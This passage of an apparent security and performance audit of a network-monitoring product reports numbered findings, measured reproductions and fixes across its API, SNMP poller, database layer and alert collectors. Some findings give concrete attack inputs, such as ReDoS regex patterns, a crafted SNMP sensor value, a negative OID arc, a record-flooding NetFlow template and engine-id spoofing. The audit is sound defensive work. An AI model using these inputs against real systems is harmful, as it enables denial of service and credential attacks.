exists to avoid, because the browser reads 401 as "your session has gone" and replaces the
page with the sign-in form. The branch is unreachable through today's route table; it is a
trap for whoever loosens the gate. Fix: three `_require` calls and the right exception type.

**API-F12 (low, security) — Fixed.** The api reviewer's independent sighting of WEB-F2, with
the extra observation that `_body_limit`'s `path.startswith(self.LARGE_BODY_PATHS)` also grants
the 85 MB ceiling to `/api/nodes/mibs/<id>/resolve`, a route that takes no body at all. Both
halves landed in the server lane.

**API-F13 (low, performance).** `post_alerts_bulk_maintenance` (`api.py:6689`) loops
`open_maintenance()` then `set_maintenance()` per device — two lock acquisitions and one
commit each — over a scope that `_bulk_silence_device_ids` lets include a whole device group
with no cap, while `mute_many` next door demonstrates the batched shape. Fix:
`set_maintenance_many`/`clear_maintenance_many` in alertsdb (already landed in the data lane:
500 commits / 41 ms → 1 commit / 4 ms) plus the `BULK_DEVICE_ID_MAX` cap on the API side.

### Verified sound

- Route-table gating: every state-changing route carries `(module, WRITE)`; the seven
  `None`-gated routes each filter per module inside the handler, checked line by line.
- SQL injection: every caller-supplied filter reaching a store is bound, not interpolated —
  `flowdb._where`, `flows`' `order` (dict lookup with a safe default), `_agg_rows`' dimension,
  `appdb.audit_query`, `syslogdb`/`snmptrapdb` `_where`. The f-strings interpolate only
  server-built clause fragments.
- CSRF, host-header handling and the WebSocket upgrade's stricter `Origin` rule.
- Credential handling: no route returns a stored secret; `_encrypt_secret` drops the plaintext
  in a `finally`; `post_alerts_smtp_test`'s destination guard refuses to send a stored password
  to a caller-supplied host; `get_configrx_backup` re-runs redaction for a non-write caller
  rather than trusting the stored flag.
- Per-request memoisation of user and permissions is keyed on the username and reset per
  request, so a revoked grant is refused on the very next request.
- `/api/state`'s shared cache: `get_state` copies the two nested dicts before `_drop_unreadable`
  mutates them, so no account's redaction can become another's.
- Login path ordering: throttle before the semaphore and before any hashing, `check_username`
  before the name is used as a throttle key, no LDAP fallback to an empty local hash.
- Self-management guards: no self-edit of permissions, `_last_admin_guard` requires a
  surviving local admin, self-deletion and last-account deletion refused, API tokens admin-gated
  on all three routes.
- `post_settings`: `ADMIN_ONLY_SETTINGS` checked against the scope's own defaults,
  `coerce_settings(strict=True)` before anything is written, module derived from
  `api.SETTINGS_SCOPES` — the 4.46.4 `debug:write` hole stays closed.
- CSV exports: `_csv_cell` prefixes `= + - @ \t \r` on every server-built export; the row caps
  are applied and reported; the uncapped exports are each bounded by a real row count.
- `_page` clamps limit into `[1, cap]` and offset to ≥ 0 on every list route but API-F3;
  `_window`/`clamp_window` bound magnitude, ordering and span on the routes that use them.
- `wsock` framing: mask required, reserved bits and undefined opcodes refused, control frames
  bounded and unfragmented, `MAX_MESSAGE_BYTES` checked from the length field before the
  payload is read and again across fragments, `close()` idempotent from any thread.
- 5.9.0's maintenance subtraction is applied consistently by all three consumers and re-counts
  `down` with an exclusion clause rather than subtracting across two reads.

---

## Poller and the SNMP/ICMP wire stack

`netpath/nodepoll.py` (7,531 lines), `snmppoll.py`, `snmpcrypt.py`, `udpsock.py`,
`mibparse.py`, `nodediscover.py`, `fortipoll.py`, with `trapdecode.py`'s BER layer read in
full.

The cryptography and the BER decoder are in good shape — bounds on every length, iterative
parsing with no recursion anywhere in the decode path, verify-then-decrypt ordering, a
deliberate refusal of privacy-without-auth, and a decrypt failure message that withholds the
parser's byte complaint because that complaint is a keystream oracle. What is missing is
arithmetic and identifier validation on values that come off the wire or out of a MIB file:
two high findings are unbounded integer work reachable from a single device answer, and both
were proved by execution (`exit=124` under `timeout 30`). The remaining set is round-trip
economics — one socket per interface, one settings query per walk, one GET for an entire MIB.
This lane is complete.

**POLL-F1 (high, security).** `_scaled_sensor_value` (`nodepoll.py:4930`) computes
`raw * (10 ** (3 * (scale - 9))) / (10 ** precision)` with `scale` and `precision` straight off
the polled device; `trapdecode._decode_value`'s `T_INTEGER` arm returns `_signed(...)` with no
bound, and RFC 3433's nine legal scale values are not checked. A device answering
`entPhySensorScale.1001 = 2147483647` — a perfectly legal `Integer32` — makes CPython build a
multi-billion-digit integer: driving the real `_decode_entity_sensor` gave `exit=124` after
30 s, and the growth curve is `10^6 → 1.183 s`, `10^7 → 47.404 s`. The same object is read on
the **HTTP thread** through `read_dom`/`read_dom_all`/`read_hardware`, so opening that device's
interface dialog hangs a web worker too, and `_run_one`'s `except Exception` never runs because
nothing is raised. Fixed: scale clamped to RFC 3433's 1..17 (yocto to yotta) and precision to -8..9 before any arithmetic,
with `T_INTEGER` clamped to Integer32 in the decoder as the second line.

**POLL-F2 (high, security/correctness).** `enc_oid` (`trapdecode.py:784`) does
`chunk = [value & 0x7F]; value >>= 7; while value:` — and `-1 >> 7 == -1` in Python, so a
negative arc never terminates (`timeout 10 … enc_oid('1.3.6.1.4.1.-1')` → `exit=124`). Three
paths feed it unvalidated text: `mibparse._parse_oid_tail` tokenises arcs with `-?\d+` and
really does emit `1.3.6.1.4.1.-7`; `nodeoids.normalize_oid` and `nodepoll.walk_subtree` validate
with `str.isdigit()`, which is True for `'²'` while `int('²')` raises; and
`api.put_nodes_mib_object` stored whatever string was posted. The hang is reachable without
operator involvement, because `_auto_assign_mib` assigns a vendor MIB to every device under
that vendor's arc. The non-numeric case is worse in a quieter way: `ValueError` is not an
`SnmpError`, so it escapes every handler in `_poll_device`, `record_poll` never runs, and the
device's status, `last_poll_ts` and `snmp_error` freeze for good — the same shape as the 5.8.0
`int(None)` regression, through a different door. Fixed at every entry: MIB file, OID override
and browser, with a poll that meets one still recording its result and the reason.

**POLL-F3 (medium, security/performance).** `_walk_column_detail` stops at
`snmp_walk_max_rows` (default 16,384) **rows** and stores `vb["value"]`, which for a
non-printable octet string is `" ".join(f"{b:02X}")` — three characters of Python `str` per
wire byte, and only `text` is truncated, to 4,096. Round-tripped through the real
`decode_response`: 64,000 raw bytes became a 191,999-character value, 192,048 bytes retained;
16,384 rows of that is ≈ 3.1 GB in one dict on one poll worker. `deadline` defaults to `None`
and only the VLAN walk and `_cisco_vlan_fdb` pass one, so an agent answering each GETBULK just
inside its timeout can hold a worker for roughly 20 minutes on one of the ~30 walks a poll
makes. Fixed: a 4 MiB retained-bytes cap with the reason recorded, and a time budget on every
column walk derived from the poll interval.

**POLL-F4 (medium, security).** `_decode_v3` reads `msgID` only to advance the cursor
(`snmppoll.py:425`) and `Response` has no `msg_id` field, while `_check_stray` correctly exempts
Reports from the request-id filter. For a Report the only remaining checks are the source
address and `v3_exchange`'s `trusted` rule, which deliberately admits `usmStatsUnknownEngineIDs`
under any engine id — that being the Report whose job is to teach one. An attacker who can spoof
the device's address therefore installs an engine id of their choosing in `EngineCache`; the
device stops polling, and every retry goes out signed with `localized_key(password, E_chosen)`,
an offline oracle against the auth password that USM does not otherwise offer. The code comment
at `nodepoll.py:628-640` already states the exposure and calls the mitigation "not a proof".
Fixed: `msg_id` carried on `Response` and matched against the request it answers; a mismatch
counts as a dropped stray.

**POLL-F5 (medium, performance).** `_poll_interfaces` enumerates ifIndex with a bulk walk and
then issues one GET per index through `_snmp_get`, which builds a new `_Session` — a new socket
— each call, and on v3 re-runs `credential_for` and its decrypt. A 512-port chassis at 40 ms RTT
is 20.5 s of strictly serial round trips, which is why `_INTERFACE_BUDGET_FRACTION = 0.5` exists:
past 30 s on a 60 s profile the read is cut off, `complete` goes False and the device permanently
reports a partial table. At fleet scale it is also ~500,000 new UDP conntrack entries per cycle
on a 1,000-device fleet. Fixed for the contained half: one session, one credential decrypt and
one engine-cache read for the whole interface read (32 interfaces: 33 sockets/decrypts → 1).
The column-oriented read is P1.

**POLL-F6 (medium, correctness/design).** `_poll_custom_mib` builds
`instance_oids = [f"{o['oid']}.0" for o in objects]` for every resolved object in the file and
sends one GET, with no chunking and no `tooBig` handling — `_check_error_status` raises only on
`authorizationError(16)`, so a `tooBig(1)` Response returns normally with an empty varbind list,
no metric is produced and nothing is logged. Parsing the bundled MIBs gives the varbind counts a
single GET would carry: IP-MIB 267 objects, LLDP-MIB 96, HOST-RESOURCES-MIB 97, BRIDGE-MIB 69,
IF-MIB 74; most agents cap a Response well below 267. Since `_auto_assign_mib` records a
`mib_assigned` event promising the vendor data will now be decoded, the feature could be silently
producing nothing on every poll. Fixed: batches of 25, halving on `tooBig` — the logic
`_walk_column_detail` already has for GETBULK.

**POLL-F7 (low, performance).** `_walk_column_detail` reads the settings table for
`snmp_walk_max_rows` and then calls `_bulk_settings`, which reads it again for
`snmp_bulk_max_repetitions`: two full `SELECT key, value FROM settings` plus a 45-key
`coerce_settings` per column walk, measured at 33.0 µs each, on the shared nodes-db lock. A full
poll makes roughly thirty walks; 1,000 devices on a 60 s interval is ~60,000 lock acquisitions a
minute to re-read constants, in a module whose `_read_pool_settings` exists to avoid exactly
this. Fixed by caching both values at settings save.

**POLL-F8 (low, performance/maintainability).** `_forget_devices`' docstring says every
per-device cache is pruned "so a long-running install [does not] accumulate an entry per device
ever deleted", and a mechanical diff of the members declared in `__init__` against those it names
found six that are not: `_auth_failing`, `_access_denied`, `_downgraded`, `_method_seeded`,
`_snmp_failing_count` and `_discovery_jobs` — the last pruned nowhere at all, so a finished sweep
keeps its settings dict, its `_owners` map (up to `max_scan_addresses`, default 1,024) and its
dead `Thread` for the process lifetime, and `drain()`'s 50 ms poll walks the whole dict. Fixed.

**POLL-F9 (low, security).** `credential_for` raises
`SnmpError(f"the community {identity!r} contains a comma — …")` at `nodepoll.py:470`, three
screens above `_credential_label`, whose docstring says a community string is a secret and must
never be printed. `_poll_device` assigns `snmp_error = str(exc)`, so the community reaches
`devices.snmp_error`, the `down` event's detail, the per-poll Debug line, the API and any alert
mail. Fixed: the refusal stands, the message no longer echoes the value.

### Verified sound

- BER decoder bounds: high-tag form, indefinite length, `0xFF`, >4-byte lengths and
  value-overruns all refused; parsing iterative throughout, so no stack-depth exposure;
  `_read_varbinds` always advances before `continue`.
- Verify-then-decrypt ordering, the privacy-without-auth refusal, and the deliberately vague
  decrypt failure message (the keystream-byte oracle is closed).
- Request-id and source checks on every reply path; the two exempt sites are the unauthenticated
  discovery probes, whose answer is a Report.
- `snmpcrypt.py` in full: counter salt from an `os.urandom` start under its own lock, never
  all-zero; `iv_for` masks boots/time to 32 bits; `available()` runs a real NIST SP 800-38A
  known-answer test and catches the pyo3 `PanicException` while letting `KeyboardInterrupt`
  through.
- `_KEY_CACHE` locking (5.8.1's fix): get+`move_to_end` and set+`popitem` both inside the lock,
  the 1 MiB hash outside it, bounded at 256 and keyed on `(proto, password, engine_id)`.
- Credential handling in the poller: decrypt just in time, never cached, cleared in `finally`;
  an undecryptable blob raises rather than downgrading; `ipam_dhcp` passes the PowerShell
  password by environment variable to a fixed `-File` script.
- Subprocess use: argument lists everywhere, no `shell=True`, and no device-supplied string
  reaches a command line.
- MIB text parsing: landmark-then-bounded-window throughout, no nested quantifier, deadline
  checked every 4,096 iterations, `\d{1,100}` guarding `int()`'s digit limit, cycles guarded.
- MIB zip handling: declared uncompressed sizes checked before reading, member count and
  per-file size capped, one byte read past the cap to catch a lying header, names flattened.
- Scheduler and autoscaler: the 5.9.0 stagger only ever moves a poll earlier, `_submit`'s dedup
  is under the lock with the `executor.submit` outside it, the shrink votes and cooldown bound
  how many executors can be abandoned.
- 5.8.1's engine-cache timeout rule matches what the changelog claims.
- `counter_rate`, `interface_speed_bps` and `detect_reboot` handle wrap, reset, the
  `4294967295` sentinel and the two vendor speed quirks with no unbounded arithmetic.
- `udpsock.py`: dual-stack bind with IPv4 fallback, `SO_EXCLUSIVEADDRUSE` on Windows, the
  Windows ICMP-unreachable `continue`, bounded LRU, shared join budget.

---

## Data layer

`netpath/sqlitebase.py`, `db.py`, `appdb.py`, `nodesdb.py` (4,765 lines), `nodesseriesdb.py`,
`nodesmibdb.py`, `alertsdb.py` (3,231 lines), `mapperdb.py`, `wirelessdb.py`, plus `flowdb.py`,
`syslogdb.py`, `snmptrapdb.py`, `configrxdb.py`, `ipamdb.py` read for every SQL statement.

The shared base class is doing its job: the pragma set and the 0600 chmod of the db/`-wal`/`-shm`
triple, the instrumented re-entrant lock, the adaptive `_delete_batches` with its documented
asymmetric band, and a scan of all fourteen modules found no row-by-row commit anywhere in a
write path. The defects are the places where a store did *not* use the machinery beside it: two
prefix LIKEs where a range predicate was already the house pattern, two prunes that 5.5.0's
batching pass missed, ten search paths that never escaped their LIKE needle, six `IN` clauses that
skipped `id_chunks`, and four credential-holding stores left at `synchronous=NORMAL` while the
three holding the same class of secret were raised to `FULL`. One finding is a secret in the wrong
place entirely. All but that one are fixed.

**DATA-F1 (high, security).** The trap receiver's SNMPv3 users — name, hash algorithm and
**authentication password** — are an ordinary row in `snmp.db`'s `settings` table as plain JSON
(`snmptrapdb.py:107-113`, `"v3_users": ""` in `DEFAULTS`), returned verbatim by `/api/config` as
`snmp_settings` to any account holding `snmp: read`. Saving through the real `SnmpTrapDatabase`
gave `settings() returns: 'noc / SHA / correcthorsebatterystaple'` and
`plaintext password present in snmp.db bytes: True`. Every other SNMPv3 password in the product
is a DPAPI-encrypted `*_pass_enc` BLOB exposed only as `has_credential: bool`, and
`CREDENTIAL-SECURITY.md:793-796` says flatly that no password is stored in a recoverable form or
returned through any API response — the document has no section covering the trap receiver at all.
The fix (trapsecrets lane) keeps the textarea format operators already use, stores
the password DPAPI-encrypted in its own table, has `settings()` mask it the way
`AlertsDatabase.settings()` reduces the SMTP password to `has_smtp_credential`, and keeps the
stored value when the placeholder comes back unchanged.

**DATA-F2 (high, performance).** `has_mib_covering` and `mib_file_covering`
(`nodesmibdb.py:182`, `:197`) filter with `oid LIKE '<prefix>.%'`, which against a BINARY-collated
column gives SQLite only a lower bound — the index is scanned to its end, and the `GROUP BY`
abandons `ix_mib_objects_oid` entirely. `_check_vendor_mib` calls this **on every poll of every
device**. At 120,000 objects across four vendor bundles: `has_mib_covering` 9.385 ms with LIKE
versus 0.006 ms with a range, and 11.894 ms versus 0.004 ms for an uncovered arc;
`mib_file_covering` 30.403 ms versus 12.885 ms covered, 28.532 ms versus 0.008 ms uncovered. At
2,000 devices on a 120 s interval that is ~17% of a core and ~17% duty cycle on that store's lock,
permanently, and worse with every MIB uploaded — invisible on a fresh install because the table is
empty. Fixed with the file's own `enterprise_objects` expression, `oid >= prefix + "." AND oid <
prefix + "/"`; `'/'` is `'.'+1` in ASCII, so the range and the pattern select the identical set.

**DATA-F3 (high, performance).** The `alerts` table carries five indexes, none on `opened_ts` or
`last_notified_ts`, so `alerts_due_first_notify` (`alertsdb.py:2145`) and `histogram`
(`:2030`) both scan it — the first on every `TICK_S = 5.0` engine tick because
`notify_rollup_delay_s` defaults to 240, the second per Alerts-overview request per open tab. At
one million rows through the real store after `ANALYZE`: 106.5 ms to discover five pending
notifications, and 94.8 ms for a 24-hour histogram, both holding the lock the Alerts page,
mute/maintenance reads and every `open_or_increment` queue behind. Fixed with two indexes —
`ix_alerts_pending_notify ON alerts(opened_ts) WHERE last_notified_ts IS NULL` (partial, so the
writer pays one entry for the handful of rows awaiting a first notice, which answers 5.5.0's own
objection to renotify indexes) and a plain `ix_alerts_opened` — measured after at 0.1 ms and
11.1 ms.

**DATA-F4 (high, performance).** 5.5.0 batched syslog, alerts, traps, NetFlow and the six
`nodes.db` walk tables; `nodesdb.prune` (`:4395`) and `nodesseriesdb.prune` (`:456`) were left as
five single DELETEs under one lock hold — including the delete on `samples`, the largest table in
the product. Measured with a reader thread taking the store lock every 2 ms: 400,000 samples
pruned in 1,864 ms with a worst reader stall of 919 ms; 500,000 device events in 2,594 ms with a
1,259 ms stall. Both are index-driven — the indexes are right, the lock hold is the defect. The
sharper case is `POST /api/maintenance` action `prune_nodes` with `sample_days=0`, which issues
`DELETE FROM samples` for the whole table **on the HTTP request thread**: at 2,000 devices ×
~20 metrics × 3 days × 120 s that is ~86 M rows in one statement, the poll pool stalled for
minutes and the request timed out — next to three sibling buttons that are batched. Fixed via
`_delete_batches` in the same shape `_prune_seen_ts` and `_batched_delete_alerts` already use.

**DATA-F5 (medium, correctness).** Ten search paths build `f"%{text}%"` from an operator's search
box and bind it to a bare `LIKE ?` — `nodesdb.py:1688` and `:1768`, `appdb.py:882`,
`alertsdb.py:1945`, `flowdb.py:936`, `snmptrapdb._where`/`_scan_clause`, `syslogdb.py:586`/`:664`,
`ipamdb.py:791`/`:831` — while `appdb.audit_query` (`:823`) does it correctly with
`LIKE ? ESCAPE '\'` and the needle escaped. There is no injection, but `_` means "any character"
and `%` means "anything", so the search answers a different question from the one asked:
`devices(text='core_sw')` returned both `core-sw-1` and `core_sw_2`, and `devices(text='%')`
returned every device. On a fleet where hyphen and underscore conventions coexist, the list is
quietly wrong at the moment somebody is deciding which switch to walk to. Fixed with
`like_contains`/`like_prefix` helpers in `sqlitebase.py` and `ESCAPE '\'` on each clause; a typed
`_` or `%` now matches itself. Eight of the ten shipped in 5.9.1; the trap store's two —
`_where`'s Source, OID/name and Community filters and `_scan_clause` over `SCAN_COLUMNS` — were
missed then (this entry's site list pointed at the wrong lines of that file) and shipped in
5.11.0, covered by the traps section of `tests/test_search_wildcards.py`.

**DATA-F6 (medium, design/durability).** The base pragma set is
`journal_mode=WAL, synchronous=NORMAL`, overridden to `FULL` in `db.py`, `appdb.py` and
`ipamdb.py` with the reason written down — "these rows must survive a power loss". The three
stores holding the same class of secret did not get it: `nodes.db`
(`devices`/`groups`/`group_credentials`, including `v3_auth_pass_enc` and `v3_priv_pass_enc`),
`configrx.db` (`ssh_password_enc`, `enable_secret_enc`), `wireless.db` (`v3_auth_pass_enc`), and
`alerts.db` (`smtp_credential`). WAL at `synchronous=NORMAL` never corrupts the file but does not
fsync at commit, so an administrator can type an SSH password, get the green confirmation, lose
power, and find `has_credential` false with ConfigRX quietly no longer backing that device up.
Flipping whole stores to `FULL` would be a real regression — `nodes.db` takes one `record_poll`
commit per device per poll — so the fix is a `_commit_durable()` helper checkpointing after the
six credential writers only; ordinary writes keep the cheap commit.

**DATA-F7 (low, maintainability/portability).** Six sites in `alertsdb` and `configrxdb` build
`",".join("?" * len(ids))` without `id_chunks`, which neither module imports though `syslogdb` and
`nodesdb` do: `resolve_many`, `acknowledge_many`, `unacknowledge_many`,
`resolve_by_dedup_prefix`'s read-back, `configrxdb.delete_backups` and `configrxdb.prune`'s stale
list. The last is not operator-driven at all — an install that ran with
`retention_count_per_device = 0` for a year and then sets it to 30 produces a stale list of every
surplus backup in one statement. Fixed by chunking inside the existing single lock and commit, so
the transaction boundary is unchanged.

### Verified sound

- `sqlitebase.connect`'s pragma set and `_tighten`'s 0600 chmod of the db/`-wal`/`-shm` triple,
  including the deliberate second `_tighten` after WAL creates the companions.
- `InstrumentedLock`'s per-thread re-entrancy depth, and its deliberate pass-through of a release
  on a lock this thread does not hold.
- `SqliteStore.close`'s bounded acquire and `_closed` flag; `NodesDatabase.close` spending one
  budget across all three connections.
- `_delete_batches`' adaptive chunk sizing and the `time.sleep(0)` in `reclaim` that lets a waiting
  writer be scheduled.
- No row-by-row commits: all eleven `commit()`-in-a-loop hits across fourteen modules are
  deliberate batch boundaries.
- `nodesdb.devices()`'s `ORDER BY name COLLATE NOCASE, ip` is served directly by
  `ix_devices_name_ip` with no temp B-tree.
- `configrxdb.prune`'s `ts <` delete skip-scans `ix_backups_device` and needs no new index.
- `flowdb.prune`/`_prune_rollup`/`trim_to_size` and `syslogdb.prune` are properly batched — which
  is what made DATA-F4's two omissions visible as omissions.
- `alertsdb.resolve_by_dedup_prefix` and `nodesseriesdb.metrics_for_families` both already use a
  range predicate rather than LIKE, with the reasoning written down.
- `appdb.audit_query` escapes its LIKE needle in the right order (backslash first) — the model
  DATA-F5 generalises.
- `appdb.migrate_from` copies, commits and verifies row counts before dropping anything, with
  `INSERT OR REPLACE` at every step.
- The 5.0.0 nodes split: the `_before_schema` ordering, the `_SPLIT_STATE` guard, the row-count
  checks before each return, and `_attached`'s always-DETACH context manager.
- `coerce_settings` plus the per-store range clamps layered over it; every writer goes through
  both.
- Community strings stored in the clear in `nodes.db`, `snmp.db` and `wireless.db` are a
  documented, reasoned decision (`CREDENTIAL-SECURITY.md:389-402`) — only the v3 password in
  DATA-F1 contradicts the document.
- `ensure_columns` is idempotent by construction; no migration rewrites a whole table on every
  start.

---

## Alerts, collectors and ConfigRX

`netpath/alertengine.py` (3,263 lines), `alertrules.py`, `alertmail.py`, `report.py`, `monitor.py`,
`tracer.py`, `namelookup.py`, `analysis.py`, `collector.py`, `nfdecode.py`, `syslogd.py`,
`syslogparse.py`, `snmptrapd.py`, `configrx*.py`, `mapper.py`, `udpsock.py`, `eventlog.py`.

This is the largest area by finding count (18) and the one with the most measured numbers behind
them. The decoders are well bounded in general — the template cache, the offset arithmetic, the
v5 count clamp, the `MAX_PLAUSIBLE_SAMPLING` clamp — and the mail path's header-injection and
redirect refusals were verified empirically. The defects cluster in three places: structures keyed
on wire data that are bounded everywhere except one (ALRT-F1, F3), per-tick reads that fetch a
whole table to compute a number a `GROUP BY` would answer (F6, F7, F10, F13), and secrets or
sanitising rules one pattern short of the vendors the product ships support for (F5, F9, F17).
The whole lane is complete; it started after the data lane because it shares `ipamdb.py`.

**ALRT-F1 (critical, security/performance).** Every structure in the v9/IPFIX decoder keyed on
wire data is a bounded LRU with a comment saying why — except `Decoder.learned_rates`
(`nfdecode.py:300`), a plain unbounded list. Each entry costs the writer thread one
`UPDATE flows … WHERE ts_end >= ?` over the whole 900-second retention window, serially, under the
FlowDatabase lock. Because `self.sampling` is an LRU of 4,096, a sender rotating `flowSamplerID`
past 4,096 makes every subsequent options record miss the cache and append. Measured: 20,000
options records of ~44 bytes each — ~880 KB of UDP and 140.5 ms of the sender's CPU — produced
20,000 learned rates, and `record_sampling_rates` ran at 43.4 ms each against a 200,000-row window,
extrapolating to **868 s of writer thread**. Meanwhile the receive queue (`QUEUE_SIZE=20000`) fills
and every real flow is dropped, and the NetFlow pages block on the same lock. Fix: a bounded dict
keyed on `(exporter, domain, sampler_id)` capped at `MAX_SAMPLING` with the latest rate winning,
plus at most 64 rewrites per flush with the remainder carried — a legitimately announced rate still
rewrites its own window, one flush later at worst.

**ALRT-F2 (high, security).** `_has_nested_repetition` refuses `(a+)+` but explicitly exempts a
bounded outer repeat, on the reasoning that `(\d{1,3}\.){3}` is safe — and it is, but a bound of
100 is not, and `_has_adjacent_quantifiers` reads `{1,100}` as literal characters. Measured:
`(a+){1,100}b`, `(a+){2,64}b`, `([a-z]+){1,50}!` and `(.+){1,100}zzz` are all **accepted** by
`compile_bounded`, and against `'a'*n` the cost runs 0.1160 s at n=20, 1.6509 s at n=24, 6.5221 s
at n=26, 27.5833 s at n=28 — 4× per two characters, against a `MAX_LINE_CHARS_FOR_MATCH` of 250.
Any account with `configrx: read` can post one through `GET /api/configrx/search?mode=regex`;
`SEARCH_BUDGET_S` is checked before each line and a single `pattern.search` is not interruptible,
and `daemon_threads` means N requests peg N cores permanently. The same pattern saved as a
compliance rule or an `ignore_line_patterns` line hangs the ConfigRX worker instead. Fix: report a
counted quantifier whose upper bound exceeds 4 as unbounded, which keeps the documented exemption
for small fixed repeats intact; the polynomial case the heuristic allows on purpose (`a*a*a*b`,
0.2816 s at n=250) stays allowed.

**ALRT-F3 (high, security/performance).** Templates are capped at fields and at 64 per exporter,
but nothing caps how many *records* one data set yields: a template of a single 1-byte field gives
`Template.length == 1`, so `_read_data`'s `while offset < len(body)` emits one `Flow` per byte.
Measured from one crafted 65,507-byte datagram: **65,483 flows, 617.4 ms, ~47.7 MB** of Flow
objects, and ~65k rows written to flows.db — roughly 100× storage amplification on the wire bytes.
The collector's queue comment assumes ~30 flows per datagram, so its real ceiling becomes ~1.3
billion buffered flows. With the shipped `auto_accept_exporters=True` the source is spoofable. Fix:
a `MAX_FLOWS_PER_PACKET` cap counted into a new `truncated_flows` stat the way `too_many_varbinds`
already is for traps, plus a floor on `Template.length`.

**ALRT-F4 (high, correctness).** `_sweep_notify_rollup` step 4 (`alertengine.py:3080`) skips a
muted alert and deliberately leaves `last_notified_ts` NULL so a device released before anyone sees
it still gets the notice. But `alerts_due_first_notify` has a backlog floor —
`AND (opened_ts >= ? OR maint_held_notify_ts IS NOT NULL)` at 3600 s — whose only exemption is a
mark that maintenance *mode* sets, while mutes run to `MAX_MUTE_HOURS = 24` and maintenance windows
are routinely longer than an hour. `mute_repro.py` against real databases and a real engine:
the alert opened held, the mute lifted, `emails=0 last_notified_ts=None`,
`still in alerts_due_first_notify? False`, and `_sweep_renotify` skips it for ever because of its
own NULL guard — the alert sits open reading "None sent." indefinitely. The existing suite covers
the intent but unmutes in the same second and never crosses the hour-old floor its own section 9c
introduced. Fix: stamp `maint_held_notify_ts` in step 4 for the mute/window case, so the sweep keeps
re-checking and releases the moment the silence lifts.

**ALRT-F5 (medium, security).** Every SNMP-community pattern in `configrx_redact.PATTERNS` anchors
on the Cisco spelling `^\s*snmp-server\s+community\s+`. Siemens SCALANCE writes
`snmp community <x> ro` and Ubiquiti airOS writes `snmp.1.community=<x>`; run against the repo's own
demo personas both give **0 redactions**, and the community is stored verbatim in `configrx.db` and
served by the backup-content and diff routes that the module documents as redacted by default. Both
vendors have `VENDORS` entries and dedicated test suites. Fix: the Siemens/Moxa spelling with a tail
group so `ro`/`rw` survives, the airOS `snmp(\.\d+)?\.community=` form, and the airOS `wpakey`/`psk`
keys at the same time.

**ALRT-F6 (medium, performance).** `_evaluate_dhcp_thresholds` materialises the entire
`dhcp_leases` table as `sqlite3.Row` objects on every 5-second tick, under `ipam.db`'s lock, to
compute `len(rows)` and `sum(is_reservation)` per scope — numbers that change at most once per
15-minute DHCP poll. At 60 scopes × 400 leases the pass measured 109.8 / 98.4 / 104.3 ms against
5.6 ms for the `GROUP BY` equivalent; 100k leases would be ~430 ms of every tick. Fix: an
`IpamDatabase.dhcp_scope_usage()` returning the two aggregates, identical arithmetic.

**ALRT-F7 (medium, performance).** `_drain_ipam_conflicts` is the one drain that does not use a
cursor-scoped paged reader: it runs `conflicts(include_resolved=True)` — every conflict ever
recorded — and filters `row["id"] > cursor` in Python, twelve times a minute, so `_read_forward`,
`DRAIN_ROW_BUDGET` and `DRAIN_TIME_BUDGET_S` all pass it by. At 20,000 rows: 57.5 / 68.7 / 60.6 ms
per tick against 0.153 ms for the indexed `id > cursor` equivalent. Fix: a `conflicts_since(cursor,
limit)` routed through `_read_forward` like every other source, which also picks up the budgets and
the `backlog` counter.

**ALRT-F8 (medium, security/design).** Both of the collector's `log.add` calls
(`collector.py:145`, `:156`) are unthrottled, where the trap and syslog listeners route every
flood-capable message through `UdpReceiver._log_throttled` at four sites. The event log is a
3,000-entry in-memory ring, so a flood of runt datagrams empties it of everything useful within
3,000 packets — instantly at any flood rate, and exactly when an operator would look at it — and
each line costs a `data[:32].hex(' ')` and an LRU update on the receive thread. Nothing grows
without bound; the damage is the loss of the diagnostic. Fix: `_log_throttled`, which already
evaluates a callable `detail` lazily, leaving the counters untouched so the status strip still shows
the full volume.

**ALRT-F9 (medium, security).** `webhook_url` and `webhook_headers` are plain settings values
(`alertsdb.py:279`) returned verbatim by `settings()` while the SMTP password beside them is reduced
to `has_smtp_credential`, and they reach any `alerts: read` account through `/api/config`. For
Slack, Teams and PagerDuty the incoming-webhook URL *is* the bearer credential, and the headers
field's own UI placeholder is `Authorization: Bearer …`; `CREDENTIAL-SECURITY.md`'s table has no row
for a webhook credential at all. The URL is also written into `notifications.to_addr` and returned
by `GET /api/alerts/{id}` at `alerts: read`, so tightening the settings payload alone would not
close it. The contained half ships now: scheme+host only in `to_addr` (all an operator reading
delivery history needs) and `webhook_headers` masked for non-reveal callers. The real credential
slot is P1, which is why this row reads Contained rather than Fixed. The narrowing itself covered
only `_webhook_result`'s delivery-history row at first: the four rows written when a delivery never
happens -- over the per-hour limit and send-queue-full, in `_webhook_notify` and `_webhook_digest`
alike -- still wrote the raw URL until 5.11.0, reachable by nothing more exotic than a busy hour.

**ALRT-F10 (medium, performance).** `_absorb_subordinates` and `_absorb_children_of` call
`self.db.rule_by_key(child_key)` in a loop, and `_drain_device_events`/`_drain_interface_events`
call it per event row, while `_tick` builds `self._rules_by_key` once per tick for exactly this
purpose. `ROLLS_UP["device_down"]` has 14 entries, so the 499-device site outage the code's own
comments describe — 377 device_down alerts opening in one tick, each absorbing 14 children, plus 14
more per downstream device — is several thousand single-row queries in one tick for answers the
engine already holds. Fix: a `_rule_by_key` helper preferring the snapshot with a fallback to the
database, which must stay because `_rules_by_key` holds only enabled rules and the absorb paths
deliberately resolve a disabled rule's open children.

**ALRT-F11 (low, performance).** `_read_until_prompt` appends each 64 KB read to `chunks` and then
rebuilds the whole capture with `"".join(chunks)` to hand `_waiting_at` a buffer it slices to the
last 4,096 characters; `_read_until_match` joins twice per iteration. Simulated at 64 KB chunks:
2 MB config 22.3 ms versus 0.4 ms tail-only, 8 MB 453.4 ms versus 2.4 ms, 20 MB 2,663.0 ms versus
6.3 ms — quadratic in the capture size, with up to 16 ConfigRX workers doing it concurrently. Fix:
a rolling 4,096-character tail, joining once at each return.

**ALRT-F12 (low, correctness).** `_mail_result` and `_webhook_result` do
`self.counters[...] += 1` on the mail and webhook worker threads while `_tick` increments the same
dict on the engine thread — the identical defect 4.46.4 fixed for the poller counters, in the two
callbacks that pass did not cover. It never over-reports, so a mass-outage digest reads as
"notifications were lost". Fix: three lines under the existing `_system_lock`.

**ALRT-F13 (low, performance).** `_device_for_source` is carefully memoised per drain with a
docstring explaining that the uncached form would be the most expensive lookup of the drain — and
then `_source_name` on the very next line is not, so an unmanaged sender costs one `app.db`
`hostnames([ip])` query per row. Measured: 2,000 single-IP calls 19.5 ms against 6.4 ms batched;
a full `DRAIN_ROW_BUDGET` of 5,000 rows is ~50 ms per tick on the lock the reverse-DNS resolver
